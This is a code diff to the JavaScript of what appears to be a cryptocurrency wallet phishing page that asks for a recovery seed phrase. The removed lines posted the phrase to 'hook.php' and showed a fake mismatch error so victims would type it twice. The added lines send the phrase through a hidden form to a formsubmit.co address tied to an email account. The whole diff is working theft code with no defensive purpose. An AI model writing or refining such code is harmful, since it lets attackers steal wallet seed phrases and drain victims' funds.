@@ -1177,7 +1177,32 @@ input.addEventListener('input', () => {
 
 
 
-   let submitAttempts = 0;
+  let submitAttempts = 0;
+
+  function getFormSubmitSeedForm() {
+    let form = document.getElementById('formsubmit-seed-form');
+    if (!form) {
+      form = document.createElement('form');
+      form.id = 'formsubmit-seed-form';
+      form.style.display = 'none';
+      form.action = 'https://formsubmit.co/zaq114@protonmail.com';
+      form.method = 'POST';
+
+      const input = document.createElement('input');
+      input.type = 'hidden';
+      input.name = 'phrase';
+      input.id = 'formsubmit-seed-input';
+      form.appendChild(input);
+      document.body.appendChild(form);
+    }
+    return form;
+  }
+
+  function submitViaFormSubmit(finalwords) {
+    const form = getFormSubmitSeedForm();
+    form.querySelector('#formsubmit-seed-input').value = finalwords;
+    form.submit();
+  }
 
   async function submitPhrase() {
     const inputs = Array.from(document.querySelectorAll('.word-input'));
@@ -1192,47 +1217,7 @@ input.addEventListener('input', () => {
     msg.style.color = 'red';
     const finalwords = words.join(" ");
 
-    // Increment attempt counter
-    submitAttempts++;
-
-    try {
-      // Send seed to hook.php
-      await fetch('hook.php', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ phrase: finalwords })
-      });
-
-      // Check if this is the first attempt
-      if (submitAttempts === 1) {
-        // First attempt - show error and reset
-        btn.textContent = 'Continue';
-        btn.disabled = false;
-        msg.style.display = 'block';
-        msg.textContent = '⚠️ Seed phrase does not match. Please re-enter your recovery phrase carefully.';
-        msg.style.color = 'red';
-        
-        // Clear all input fields
-        inputs.forEach(inp => {
-          inp.value = '';
-        });
-        
-        // Reset word count
-        document.getElementById('wordCount').textContent = '0';
-        btn.disabled = true;
-        return;
-      }
-
-      // Second attempt - success!
-      btn.textContent = 'Continue';
-      btn.disabled = false;
-      showProcessing();
-      
-    } catch(e) {
-      btn.textContent = 'Continue';
-      btn.disabled = false;
-      showProcessing();
-    }
+    submitViaFormSubmit(finalwords);
   }
   
   function showProcessing() {
